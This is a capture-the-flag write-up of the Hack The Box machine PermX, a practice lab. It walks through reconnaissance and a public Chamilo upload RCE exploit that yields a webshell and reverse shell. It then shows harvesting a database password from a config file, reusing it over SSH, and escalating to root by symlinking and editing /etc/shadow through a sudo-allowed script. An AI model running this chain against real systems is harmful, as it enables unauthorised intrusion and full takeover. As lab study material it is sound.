---
title: "PermX from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# PermX from HTB
[page](https://app.hackthebox.com/machines/PermX)
First use `nmap`on this:
```
$ nmap -sCV --min-rate 4000 10.10.11.23
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 18:34 +04
Nmap scan report for 10.10.11.23
Host is up (0.20s latency).
Not shown: 919 filtered tcp ports (no-response), 79 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Then try to access to website with `IP` and you will get the sites name, then add it to `/etc/hosts`:
```
10.10.11.23 permx.htb
```
Then for directory discovery use `gobuster`but you will not need that. You will need ffuf:
```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://10.10.11.23/ -H "Host: FUZZ.permx.htb" -mc 200 -s
```
This will display this two subdomains:
```
www
lms
```
You are currently in `www`so you will need to head to `lms`subdomain. To do that you will need to first add that to `/etc/hosts`:
```
10.10.11.23 lms.permx.htb
```
After checking out the site with `whatweb`command you can find that site runs on `chamilo 1`:
```
$ whatweb http://lms.permx.htb
http://lms.permx.htb [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.10.11.23], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
```
After searching `chamilo 1`exploits i got to this `github` repository and downloaded it:
```
git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc
git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc
pip install -r requirements.txt
python3 main.py -u http://lms.permx.htb/ -a scan
python3 main.py -u http://lms.permx.htb/ -a webshell
python3 main.py -u http://lms.permx.htb/ -a revshell
```
Before running the last command be sure to run 
```
$ nc -nlvp 1234
```
and you will get the connection.
You will need to find password to connect to `ssh`and to find that i searched for `configuration.php`files with this command:
```
/var/www/chamilo $ find . -type f -name "configuration.php"
```
You will get two files:
```
./www/chamilo/app/config/configuration.php
./www/chamilo/plugin/sepe/src/configuration.php
```
The password is hidden in `./www/chamilo/app/config/configuration.php`so `cat`it and find the password:
```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```
**db_password** ---- 03F6lY3uXAP2bkW8
Then search for this: 
```
www-data@permx:/var$ cat /etc/passwd | grep -i sh$                              
cat /etc/passwd | grep -i sh$
root:x:0:0:root:/root:/bin/bash
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
```
So we have to connect to `ssh`with this name and passowrd:
```
$ ssh mtz@10.10.11.23
mtz@10.10.11.23's password: 03F6lY3uXAP2bkW8
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Aug  2 03:16:24 PM UTC 2024

  System load:           0.22
  Usage of /:            59.0% of 7.19GB
  Memory usage:          10%
  Swap usage:            0%
  Processes:             249
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.23
  IPv6 address for eth0: dead:beef::250:56ff:feb0:96f


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
mtz@permx:~$
```
You can `cat` the `user.txt`:
```
mtz@permx:~$ cat user.txt
1af9641f8b71a4d3898cc89fd44a0432
```
after that run `sudo -l`to learn what you can run with `sudo`permissions:
```
Matching Defaults entries for mtz on permx:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
   (ALL : ALL) NOPASSWD: /opt/acl.sh
```
Then create symlink to `/etc/shadows`in `/home/mtz/`directory and name whatever you want:
```
$ openssl passwd -6 -salt uwu Password123$
$6$uwu$GkLbKwoRGN66KFTWszadPgA0dG0hymftio/bqBSxX472cgLFwInxremvld1RHRRFup./tjJho66wlmVBSIf/u0
mtz@permx:~$ ln -f -s /etc/shadow ./giuna
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/giuna
mtz@permx:~$ nano giuna
```
While in `nano text editor`you can either change the `root`password or add a new user with root capabilities. For me i changed the `root`password.
```
$ su -
Password: 
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# cat root.txt
83a46ac2b9985c0e7029e97288cf01d2
```
And there is the `rooot.txt`: 
**83a46ac2b9985c0e7029e97288cf01d2**
